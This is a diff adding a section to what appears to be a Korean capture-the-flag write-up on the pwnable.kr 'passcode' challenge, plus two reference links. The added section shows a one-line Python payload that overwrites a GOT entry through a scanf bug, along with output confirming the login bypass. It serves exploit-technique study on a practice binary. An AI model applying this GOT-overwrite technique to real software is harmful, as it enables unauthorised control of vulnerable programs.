@@ -178,3 +178,18 @@ Dump of assembler code for function welcome:
         // 함수 에필로그
 End of assembler dump.
 ```
+
+## GOT Overwrite
+
+```text
+passcode@ubuntu:~$ (python -c "print 'A'*96+'\x04\xa0\x04\x08'+'134514147'"; cat) | ./passcode
+Toddler's Secure Login System 1.0 beta.
+enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
+Sorry mom.. I got confused about scanf usage :(
+enter passcode1 : Now I can safely trust you that you have credential :)
+```
+
+## 레퍼런스
+
+- [그저 빛...](http://chaneyoon.tistory.com/233)
+- [블랙펄 GOT,PLT 알려주는 포스팅](https://bpsecblog.wordpress.com/2016/03/09/about_got_plt_2/)
